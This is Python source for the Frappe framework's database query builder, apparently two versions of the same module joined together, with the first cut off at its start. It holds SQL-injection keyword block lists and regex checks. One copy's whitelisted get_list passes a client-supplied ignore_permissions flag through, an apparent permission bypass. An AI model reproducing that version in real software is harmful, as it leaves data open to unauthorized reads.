			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',                    
			'from', 'group', 'order', 'by']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.client import check_parent_permission
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):                    
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):                    
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):                    
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

